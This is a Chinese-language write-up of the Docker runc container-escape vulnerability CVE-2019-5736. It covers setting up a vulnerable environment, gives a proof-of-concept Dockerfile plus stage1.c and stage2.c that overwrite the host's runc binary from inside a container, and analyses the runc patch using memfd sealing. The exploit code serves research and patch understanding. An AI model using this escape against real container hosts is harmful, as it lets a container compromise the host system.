# Docker runc容器逃逸漏洞分析附件(CVE-2019-5736)

## 基础知识
Docker

[https://docs.docker.com/get-started/overview/](https://docs.docker.com/get-started/overview/)
[https://docs.docker.com/engine/reference/run/](https://docs.docker.com/engine/reference/run/)
[https://docs.docker.com/engine/reference/commandline/exec/](https://docs.docker.com/engine/reference/commandline/exec/)

Dockerfile

[https://docs.docker.com/engine/reference/builder/](https://docs.docker.com/engine/reference/builder/)
[https://docs.docker.com/engine/reference/builder/#from](https://docs.docker.com/engine/reference/builder/#from)
[https://docs.docker.com/engine/reference/builder/#run](https://docs.docker.com/engine/reference/builder/#run)
[https://docs.docker.com/engine/reference/builder/#add](https://docs.docker.com/engine/reference/builder/#add)
[https://docs.docker.com/engine/reference/builder/#entrypoint](https://docs.docker.com/engine/reference/builder/#entrypoint)

Linux Namespace  
Mount namespace  
setns  
mount REMOUNT  
seal  
Linux Control Group  
libseccomp  

## 环境搭建
#### 虚拟机安装
系统镜像：[https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso](https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso)

```
#  创建虚拟机硬盘
$ qemu-img create -f qcow2 ubuntu18.04.4.img 10G

# 安装虚拟机
$ qemu-system-x86_64  -m 2048 -hda ubuntu18.04.4.img -cdrom ./ubuntu-18.04.4-desktop-amd64.iso

# 启动虚拟机
$ qemu-system-x86_64 -m 2048  ubuntu18.04.4.img
```

##### Docker安装
使用Ubunt的发行版本的packeg: docker-io ( Docker官方仓库的packges: docker-ce, docker-ce-cli, container.io 漏洞已经修复)

查看可安装版本:

```
$ apt-cache policy docker.io
docker.io:
  Installed: 17.12.1-0ubuntu1
  Candidate: 19.03.6-0ubuntu1~18.04.1
  Version table:
     19.03.6-0ubuntu1~18.04.1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-updates/universe amd64 Packages
     18.09.7-0ubuntu1~18.04.4 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security/universe amd64 Packages
 *** 17.12.1-0ubuntu1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic/universe amd64 Packages
        100 /var/lib/dpkg/status
```



查看docker.io的changelog:

```
$ PAGER=cat apt-get -q=2 changelog docker.io 
...
docker.io (18.09.2-0ubuntu1) disco; urgency=medium

  * Update to 18.09.2, including fix for CVE-2019-5736.
    - Convert components/engine/git-bundles/CVE-2019-5736.bundle into
      d/patches/0001-nsenter-clone-proc-self-exe-to-avoid-exposing-host-b.patch.
    - Hard code RUNC_COMMIT in d/rules for now.

 -- Michael Hudson-Doyle <michael.hudson@ubuntu.com>  Tue, 12 Feb 2019 10:55:11 +1300

...
```

在[官网](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/docker.io_17.12.1-0ubuntu1_amd64.deb.html)下载低版本[package](http://archive.ubuntu.com/ubuntu/pool/universe/d/docker.io/docker.io_17.12.1-0ubuntu1_amd64.deb)，或者[百度云]( https://pan.baidu.com/s/1PO4OV_el6fQ0xgymF8FsXg) 密码:q9vg，下载后安装：

```
$ sudo dpkg -i docker.io_17.12.1-0ubuntu1_amd64.deb
...

$ docker --version
Docker version 17.12.1-ce, build 7390fc6

$ docker-runc --version
runc version 1.0.0-rc4+dev
commit: 9f9c96235cc97674e935002fc3d78361b696a69e
spec: 1.0.0
```


或者直接apt-get安装(如果还有的话)：

```
$ sudo apt-get install docker.io=17.12.1-0ubuntu1
```

## 复现环境PoC
链接:[https://pan.baidu.com/s/16NAGxsRR0cs2NPf9d0Qw_g](https://pan.baidu.com/s/16NAGxsRR0cs2NPf9d0Qw_g)  密码:np1j

```
$ tree
.
├── Dockerfile
├── README
├── stage1.c
└── stage2.c

0 directories, 4 files
```


```
$ cat Dockerfile
FROM ubuntu:18.04
# 继承ubuntu:18.04 image
RUN set -e -x ;\
    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
    apt -y update ;\
    apt-get -y install build-essential ;\
    cd /root ;\
    apt-get -y build-dep libseccomp ;\
    apt-get source libseccomp
    
ADD stage1.c /root/stage1.c
RUN set -e -x ;\
    cd /root/libseccomp-2.4.1 ;\
    cat /root/stage1.c >> src/api.c ;\
    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
    dpkg -i /root/*.deb
# libseccomp不知做什么的，貌似是docker的依赖包
# 原Poc这里是libseccomp-2.3.1, 但是apt-get source libseccomp会安装最新的版本，所以这个版本号需要修改
# 这几步是下载libseccomp的源码包，修改源码的src/api.c文件，追加写入了stage1.c的内容后，将libseccomp构建成dep包并安装

ADD stage2.c /root/stage2.c
RUN set -e -x ;\
    cd /root ;\
    gcc stage2.c -o /stage2
# 编译stage2.c，等待被stage1加载并执行

ENTRYPOINT [ "/entrypoint" ]


RUN set -e -x ;\
    ln -s /proc/self/exe /entrypoint
```


```
$ cat stage1.

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>


__attribute__ ((constructor)) void foo(void)
{
    int fd = open("/proc/self/exe", O_RDONLY);
    if (fd == -1 ) {
        printf("HAX: can't open /proc/self/exe\n");
        return;
    }
    printf("HAX: fd is %d\n", fd);
    char *argv2[3];
    argv2[0] = strdup("/stage2");
    char buf[128];
    snprintf(buf, 128, "/proc/self/fd/%d", fd);
    argv2[1] = buf;
    argv2[2] = 0;
    execve("/stage2", argv2, NULL);
}


/*


__attribute__ ((constructor))
The constructor attribute causes the function to be called automatically before execution enters main (). 


只读方式打开当前进程的可执行文件
初始化argv2[0] 为 /stage2
初始化argv2[1] 为 /proc/self/fd/[/proc/self/exe -> fd]
       /proc/[pid]/fd/
         This is a subdirectory containing one entry for each file
         which the process has open, named by its file descriptor, and
              which is a symbolic link to the actual file.  
              Thus, 0 is standard input, 1 standard output, 
              2 standard error, and so on.
初始化argv2[2] 为 0
execve执行子进程/stage2 参数为argv2
*/
```

```
$ cat stage2.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>


int main(int argc, char **argv) {
    printf("HAX2: argv: %s\n", argv[1]);
    int fd = open(argv[1], O_RDWR|O_APPEND);
    printf("HAX2: fd: %d\n", fd);

    const char *poc = "cve-2019-5736";
    int res = write(fd, poc, strlen(poc));
    printf("HAX2: res: %d, %d\n", res, errno);
}

/*
根据stage1传入的/proc/self/exe路径， 将poc追加写入该文件末尾，即docker-runc
证明了docker-runc可以被容器内的应用修改
*/
```


## 补丁分析
#### 补丁概述
简单总结就是：通过某种方式clone一个runc的/proc/self/exe的只读副本，该副本是一个只读的内存文件，然后重新执行clone出的内存文件，从而使runc进程的proc符号链接(/proc/self/exe)对应的是该内存文件副本。

 为了修复这个漏洞，在runc源码libcontainer/nsenter/nsexec.c 文件的nsexec函数中增加了一个ensure_cloned_binary函数调用：

```
if (ensure_cloned_binary() < 0)
		bail("could not ensure we are a cloned binary");
```
它的实现在文件libcontainer/nsenter/cloned_binary.c 中：

```
int ensure_cloned_binary(void)
{
   int execfd;
   ...
   int cloned = is_self_cloned();
   
   if (cloned > 0 || cloned == -ENOTRECOVERABLE)
     return cloned;
   ...
   execfd = clone_binary();
   ...
   fexecve(execfd, argv, environ);
   ...
}
   
```
* ensure_cloned_binary函数首先通过is_self_cloned函数判断当前进程的可执行文件是否是cloned(这里的clone可以理解成复制文件，而不是clone一个子进程的那个clone)；
* 如果runc是第一次被执行，则会返回false，然后通过clone_binary函数复制/proc/self/exe文件；
* 最后通过fexecve重新启动当前进程，对应的可执行文件是复制后的文件；
* 下一次执行的时候，is_self_cloned函数会返回true，然后进入打补丁前的正常流程。

#### package nsenter
package nsenter是做什么的？

```
$ cat README.md
The `nsenter` package registers a special init constructor that is called before the Go runtime has a chance to boot.  
This provides us the ability to `setns` on existing namespaces 
and avoid the issues that the Go runtime has with multiple 
threads.  
This constructor will be called if this package is registered, 
imported, in your go application.
```
* 对于Mount Namespace来说，一个具有多线程的进程是无法使用setns调用进入到对应的命名空间( the Go runtime has with multiple threads )。
* 所以通过CGO(CGO介绍见下文)在Go runtime 启动之前，执行一个构造函数也就是nsexec.c中的nsexec函数来进行setns操作。
* 这个构造函数会在nsenter package 被导入的时候执行。

具体实现：

在runc的main packege的源码文件init.go中，导入了package nsenter 

```
package main
import (
...
   _ "github.com/opencontainers/runc/libcontainer/nsenter"
...
)
```
package nsenter的主要内容

```
$ pwd
.../runc-master/libcontainer/nsenter
$ tree
.
├── README.md
├── cloned_binary.c
├── namespace.h
├── nsenter.go
├── nsenter_gccgo.go
├── nsenter_test.go
├── nsenter_unsupported.go
└── nsexec.c
0 directories, 8 files
```
```
$ cat nsenter.go
// +build linux,!gccgo
package nsenter
/*
#cgo CFLAGS: -Wall
extern void nsexec();
void __attribute__((constructor)) init(void) {
	nsexec();
}
*/
import "C"
```
这里用到了CGO：

```
$ cat README.md
...
The `nsenter` package will `import "C"` and it uses [cgo](https://golang.org/cmd/cgo/) package. 
In cgo, if the import of "C" is immediately preceded by a comment, that comment, called the preamble, is used as a header when compiling the C parts of the package.
...
```
CGO简单说就是: 通过go调用C语言代码，语法是 import "C"语句+前面的注释(称为preamble)，preamble部分就是C语言代码(当C代码在不同文件时，preamble可以只写头文件引用)。
具体参考：

[https://golang.org/cmd/cgo/](https://golang.org/cmd/cgo/)  
[https://bastengao.com/blog/2017/12/go-cgo-c.html](https://bastengao.com/blog/2017/12/go-cgo-c.html)

上面的代码差不多是这样的效果：

```
$ tree
.
├── cgo_c.c
└── cgo_example.go
0 directories, 2 files
$ cat cgo_c.c
#include <stdio.h>
void c_func1(){
	printf("Hello, CGO!\n");
}
void c_func2(){
	printf("Goodbye, CGO!\n");
}
$ cat cgo_example.go
package main
/*
extern void c_func1();
extern void c_func2();
void __attribute__((constructor)) init(void) {
	c_func1();
}
*/
import "C"
func main(){
	C.c_func2()
}
$ go build -o cgo
$ ./cgo
Hello, CGO!
Goodbye, CGO!
```


关于__attribute__((constructor)):

一个面向gcc的语法，功能是设置一个在main函数执行前执行的构造函数。

#### nsexec.c
大致功能：先执行clone()，参数有CLONE_PARENT及命名空间参数，使子进程和父进程是兄弟关系，并拥有自己的命名空间。

然后调用setns()加入存在的namespace。

```
/* A dummy function that just jumps to the given jumpval. */
static int child_func(void *arg) __attribute__ ((noinline));
static int child_func(void *arg)
{
   struct clone_t *ca = (struct clone_t *)arg;
   longjmp(*ca->env, ca->jmpval);
}
static int clone_parent(jmp_buf *env, int jmpval) __attribute__ ((noinline));
static int clone_parent(jmp_buf *env, int jmpval)
{
   struct clone_t ca = {
      .env = env,
      .jmpval = jmpval,
   };
   return clone(child_func, ca.stack_ptr, CLONE_PARENT | SIGCHLD, &ca);
}
```
补丁是在这些步骤之前增加了ensure_cloned_binary函数的调用。

#### ensure_cloned_binary->is_self_cloned
is_self_cloned是如何判断当前文件是否是clone过的？
...


#### ensure_cloned_binary->clone_binary
clone_binary是如何实现的？作用是什么？

尝试通过两种方式来创建一个只读的，大小不可改变的临时内存文件，作为runc可执行文件的clone。

第一种方式是通过bind mount，见try_bindfd部分

```
static int clone_binary(void)
{
    ...
	/*
	 * Before we resort to copying, let's try creating an ro-binfd in one shot
	 * by getting a handle for a read-only bind-mount of the execfd.
	 */
  
	execfd = try_bindfd();
	if (execfd >= 0)
		return execfd;
    ...
```


第二种方式: 当try_bindfd失败的时候通过make_execfd和seal_execfd来实现clone方案。

通过make_exec来创建一个内存文件，拷贝/proc/self/exe的数据后，通过seal_execfd对该内存文件设置限制使其只读。效果就是创建了一个只存在于内存中的/proc/self/exe的只读的clone文件。

```
  	/*
	 * Dammit, that didn't work -- time to copy the binary to a safe place we
	 * can seal the contents.
	 */
    execfd = make_execfd(&fdtype);
    ...
	binfd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	...
    fstat(binfd, &statbuf) 
    ...
    while (sent < statbuf.st_size) {
		int n = sendfile(execfd, binfd, NULL, statbuf.st_size - sent);
		...
		sent += n;
	}
	close(binfd);
	...
	seal_execfd(&execfd, fdtype)
	...
  	return execfd;
  	...
```

##### clone_binary->try_bindfd
尝试将/proc/self/exe通过bind mount的方式bind到一个临时文件/tmp/runc.xxxxxx

```
static int try_bindfd(void)
{
  ...
  fd = mkstemp(template);
  ...	
  ret = -EPERM;
  if (mount("/proc/self/exe", template, "", MS_BIND, "") < 0)
		goto out;
  
  ...
  if (mount("", template, "", MS_REMOUNT | MS_BIND | MS_RDONLY, "") < 0)
		goto out_umount;
  
  ...
  ret = open(template, O_PATH | O_CLOEXEC);
out_umount:
	...
	if (umount2(template, MNT_DETACH) < 0) {
		if (ret >= 0)
			close(ret);
		ret = -ENOTRECOVERABLE;
	}
  
out:
	...
	unlink(template);
	return ret;
}
  
```
一个测试Demo:

```
#define _GNU_SOURCE
#include <sys/mount.h>
#include <time.h>
#include <stdio.h>
#include <sys/types.h>   
#include <sys/stat.h>    
#include <fcntl.h>
#include <stdlib.h>
int main(){
	char template[1024] = "./target.XXXXXX";
	int fd = mkstemp(template);
	printf("%d\n", fd);
	mount("/proc/self/exe", template, "", MS_BIND, "") ;
	mount("", template, "", MS_REMOUNT | MS_BIND | MS_RDONLY, "");
	int ret = open(template, O_PATH | O_CLOEXEC);
	printf("%d\n", ret);
	sleep(20);
	umount2(template, MNT_DETACH);
	printf("umounted\n");
	sleep(1000);
}

/*
$ sudo ./mount_umount_demo 
3
4

$ ls -l
...
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo
-rw-r--r-- 1 invincible invincible  551 Apr 14 20:39 mount_umount_demo.c
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 target.xIAgUt

$ sudo ./mount_umount_demo 
3
4
umounted

$ ls -l
...
-rwxrwxr-x 1 invincible invincible 8984 Apr 14 20:39 mount_umount_demo
-rw-r--r-- 1 invincible invincible  551 Apr 14 20:39 mount_umount_demo.c
-rw------- 1 root       root          0 Apr 14 20:40 target.xIAgUt
invincible@ubuntu:~/Desktop/test/mount_test$ 
*/
```

##### clone_binary->make_execfd
这个方案中make_execfd创建内存文件也有三种方式：

* 通过memfd_create
```
#define RUNC_MEMFD_COMMENT "runc_cloned:/proc/self/exe"
#ifndef MFD_CLOEXEC
#  define MFD_CLOEXEC       0x0001U
#  define MFD_ALLOW_SEALING 0x0002U
#endif
static int make_execfd(int *fdtype)
{
	*fdtype = EFD_MEMFD;
	
	fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);
	
	if (fd >= 0)
		return fd;
```
关于memfd_create：

```
memfd_create() creates an anonymous file and returns a file
descriptor that refers to it.  The file behaves like a regular file,
and so can be modified, truncated, memory-mapped, and so on.
However, unlike a regular file, it lives in RAM and has a volatile
backing storage.
```
参考： [https://cloud.tencent.com/developer/article/1551288](https://cloud.tencent.com/developer/article/1551288)

* 通过open 设置O_TMPFILE flag的方式创建临时文件
```
	*fdtype = EFD_FILE;
	fd = open(prefix, O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);
	if (fstat(fd, &statbuf) >= 0)
    working_otmpfile = (statbuf.st_nlink == 0);
	if (working_otmpfile)
	  return fd;
```
关于open函数的O_TMPFILE标志：

```
O_TMPFILE (since Linux 3.11)
    Create an unnamed temporary regular file.  The pathname argu‐
    ment specifies a directory; an unnamed inode will be created
    in that directory's filesystem.  Anything written to the
    resulting file will be lost when the last file descriptor is
    closed, unless the file is given a name.
```
* 通过mkostemp+unlink
```
	/*
	 * Our final option is to create a temporary file the old-school way, and
	 * then unlink it so that nothing else sees it by accident.
	 */
	*fdtype = EFD_FILE;
	fd = mkostemp(template, O_CLOEXEC);
	if (fd >= 0) {
		if (unlink(template) >= 0)
			return fd;
```
关于mkostemp：
就是简单创建一个唯一名称的临时文件，并且可以使用跟open函数一样的部分flag

关于unlink:

```
unlink() deletes a name from the filesystem.  If that name was the
last link to a file and no processes have the file open, the file is
deleted and the space it was using is made available for reuse.
```
##### clone_binary->seal_execfd
* 当make_execfd中通过memfd_create成功创建了内存文件时

通过fcntl为文件添加seals，具体是该内存空间不可扩大和缩小，不可写入，

且该限制不可修改

```
#ifndef F_SEAL_SEAL
#  define F_SEAL_SEAL   0x0001 /* prevent further seals from being set */
#  define F_SEAL_SHRINK 0x0002 /* prevent file from shrinking */
#  define F_SEAL_GROW   0x0004 /* prevent file from growing */
#  define F_SEAL_WRITE  0x0008 /* prevent writes */
#endif
#define RUNC_MEMFD_SEALS \
	(F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)
static int seal_execfd(int *fd, int fdtype)
{
	switch (fdtype) {
	case EFD_MEMFD:
		return fcntl(*fd, F_ADD_SEALS, RUNC_MEMFD_SEALS);
```


* 如果是通过后两种方式创建的内存文件(open 设置O_TMPFILE或者mkostemp+unlink)

会重新使用open设置O_PATH flag打开一次，这是为了让execve可用。

```
	case EFD_FILE: {
		/* Need to re-open our pseudo-memfd as an O_PATH to avoid execve(2) giving -ETXTBSY. */
		int newfd;
		char fdpath[PATH_MAX] = {0};
		if (fchmod(*fd, 0100) < 0)
			return -1;
		if (snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", *fd) < 0)
			return -1;
		newfd = open(fdpath, O_PATH | O_CLOEXEC);
		if (newfd < 0)
			return -1;
		close(*fd);
		*fd = newfd;
		return 0;
	}
	default:
	   break;
	}
	return -1;
}
```
关于open 的O_PATH flag：

```
O_PATH (since Linux 2.6.39)
	...
    One use of O_PATH for regular files is to provide the
    equivalent of POSIX.1's O_EXEC functionality.  This permits us
    to open a file for which we have execute permission but not
    read permission, and then execute that file, with steps
    something like the following:
    char buf[PATH_MAX];
    fd = open("some_prog", O_PATH);
    snprintf(buf, PATH_MAX, "/proc/self/fd/%d", fd);
    execl(buf, "some_prog", (char *) NULL);

    An O_PATH file descriptor can also be passed as the argument
    of fexecve(3).
```
demo1:

```
//演示create_memfd + fexecve的方式
// 没有做异常处理
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/sendfile.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#define RUNC_MEMFD_COMMENT "runc_cloned:/proc/self/exe"
#ifndef F_SEAL_SEAL
#  define F_SEAL_SEAL   0x0001	/* prevent further seals from being set */
#  define F_SEAL_SHRINK 0x0002	/* prevent file from shrinking */
#  define F_SEAL_GROW   0x0004	/* prevent file from growing */
#  define F_SEAL_WRITE  0x0008	/* prevent writes */
#endif
#define RUNC_MEMFD_SEALS \
	(F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)

#ifndef F_LINUX_SPECIFIC_BASE
#  define F_LINUX_SPECIFIC_BASE 1024
#endif
#ifndef F_ADD_SEALS
#  define F_ADD_SEALS (F_LINUX_SPECIFIC_BASE + 9)
#  define F_GET_SEALS (F_LINUX_SPECIFIC_BASE + 10)
#endif

/* Use our own wrapper for memfd_create. */
#if !defined(SYS_memfd_create) && defined(__NR_memfd_create)
#  define SYS_memfd_create __NR_memfd_create
#endif
/* memfd_create(2) flags -- copied from <linux/memfd.h>. */
#ifndef MFD_CLOEXEC
#  define MFD_CLOEXEC       0x0001U
#  define MFD_ALLOW_SEALING 0x0002U
#endif
int memfd_create(const char *name, unsigned int flags)
{
#ifdef SYS_memfd_create
	return syscall(SYS_memfd_create, name, flags);
#else
	errno = ENOSYS;
	return -1;
#endif
}

int main(int argc, char *argv[]){
	if(argc > 1){
		if(strcmp(argv[1], "stage2") == 0){	
			printf("Stage 2 ok\n");
			return 0;
		}
		else{
			return -1;
		}
	}	
	// 通过memfd_create创建内存文件
	int fd = memfd_create(RUNC_MEMFD_COMMENT, MFD_CLOEXEC | MFD_ALLOW_SEALING);
	printf("%d\n", fd);
	// 把/proc/self/exe 复制到 memfd_create创建的内存文件
	int exefd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	size_t sent = 0;
	struct stat statbuf = {};
	fstat(exefd, &statbuf);
	while (sent < statbuf.st_size) {
		int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);
		sent += n;
	}
	close(exefd);
	printf("sent: %ldbytes\n", sent);
	// 添加seals约束	
	if(fcntl(fd, F_ADD_SEALS, RUNC_MEMFD_SEALS) < 0){
		perror("fcntl error");
	}
	// 执行stage2
	char *env[] = {NULL};
	char *argv2[] = {"", "stage2", NULL};
	fexecve(fd, argv2, env);
	perror("fexecve error");
}
/*
$ gcc memfd_create_demo.c -o memfd
$ ./memfd 
3
sent: 9288bytes
Stage 2 ok
*/
```


demo2:

```
// 演示open O_TEMPFILE + open O_PATH + fexecve的方式
// 没有做异常处理
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
 #include <sys/sendfile.h>
int main(int argc, char *argv[]){
	if(argc > 1){
		if(strcmp(argv[1], "stage2") == 0){	
			printf("Stage 2 ok\n");
			return 0;
		}
		else{
			return -1;
		}
	}
	struct stat statbuf = {};
	size_t sent = 0;
	char **environ;
	char *argv2[] = {"opath", "stage2", NULL};
	int fd = open("./", O_TMPFILE | O_EXCL | O_RDWR | O_CLOEXEC, 0700);
	int exefd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	fstat(exefd, &statbuf);
	while (sent < statbuf.st_size) {
		int n = sendfile(fd, exefd, NULL, statbuf.st_size - sent);
		sent += n;
	}
	close(exefd);
	fchmod(fd, 0100);
	char fdpath[1024];
	snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);
	int newfd = open(fdpath, O_PATH | O_CLOEXEC);
	close(fd);
	fexecve(newfd, argv2, environ);
	// fexecve(fd, argv2, environ);
	perror("fexecve error");
}
/*
$ gcc open_opath_demo.c -o opath
$ ./opath 
Stage 2 ok
*/
```

